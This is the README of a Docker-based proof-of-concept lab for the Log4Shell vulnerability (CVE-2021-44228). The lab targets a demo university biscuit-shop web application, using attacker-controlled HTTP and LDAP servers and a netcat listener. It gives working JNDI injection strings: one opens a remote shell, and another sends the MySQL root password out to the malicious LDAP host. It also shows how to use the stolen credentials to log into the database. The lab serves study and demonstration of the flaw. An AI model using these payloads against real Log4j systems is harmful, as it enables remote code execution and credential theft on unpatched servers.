# SpringLog4Shell PoC

This is a *proof of concept* of the Log4Shell vulnerability, [CVE-2021-44228](https://www.cve.org/CVERecord?id=CVE-2021-44228), which is completely docker based, features a concrete web application with a database (a university of Geneva biscuits catering service) and a malicious HTTP and LDAP server that deliver malicious payloads. 

## Building the Images

To build the docker images, please run the following commands from the repository folder :

```bash
cd snoopy-http-server && docker build . && cd ..
cd snoopy-ldap-server && docker build . && cd ..
cd snoopy-netcat-listener && docker build . && cd ..
cd biscuits-application && docker build . && cd ..
```

## Starting up the exploit

Run the following commands in the right order after building all the docker images : 

```bash
docker compose up -d database       # wait 10 seconds for the database to spinup, 
docker compose up application       # before launching application
docker compose up snoopy-http-server
docker compose up snoopy-ldap-server
```

Connect to `http://localhost:8080` to access the biscuits shop frontend, use username `ben` and password `benspassword`. 

### Remote Shell Exploit

Startup a netcat server to listen for an incoming TCP remote shell connection using 

```docker compose run --name snoopy-netcat-listener snoopy-netcat-listener``` 

and inject `${jndi:ldap://snoopy-ldap-server:1389/ExploitRCE}` into the frontend. 
Once the remote shell is started you can get .env values via,
```
echo $MYSQL_HOST
mysql-database
echo $MYSQL_ROOT_PASSWORD 
secret
```

Note : It is essential to use **docker compose run and not up** as the command above describes.
Indeed, docker compose up will not work correctly in interactive mode, see [this SO thread](https://stackoverflow.com/questions/36249744/interactive-shell-using-docker-compose).

### Information Leakage via Injection

The CVE is still exploitable even if you disable remote code base url trust via `com.sun.jndi.ldap.object.trustURLCodebase=false`. 
You can set this property to false inside `biscuits-application/src/mainBiscuitsApplication.java` and inject the following 
value as email : 

```
${jndi:ldap://snoopy-ldap-server:1389/${env:MYSQL_ROOT_PASSWORD}}
```


### Accessing the various services,

Once the login information compromised, you can access the mysql database via, 

```mysql -h 127.0.0.1 -P 3306 -u root -p biscuits```

For the sake of testing, you can query the spring LDAP authentication server via 

```
ldapsearch -x -D "uid=ben,ou=people,dc=unige,dc=ch" -W -H ldap://0.0.0.0:8389 -b "ou=people,dc=unige,dc=ch" -s sub "uid=*"
```

Query the malicious LDAP server via 

```
ldapsearch -H ldap://0.0.0.0:1389 -b "dc=example,dc=com" -s sub -x "(objectclass=*)"
``` 

Access the malicious http server at http://localhost:8000 to view what files are being hosted.

### Dependencies : 

Working install of docker and docker compose. 

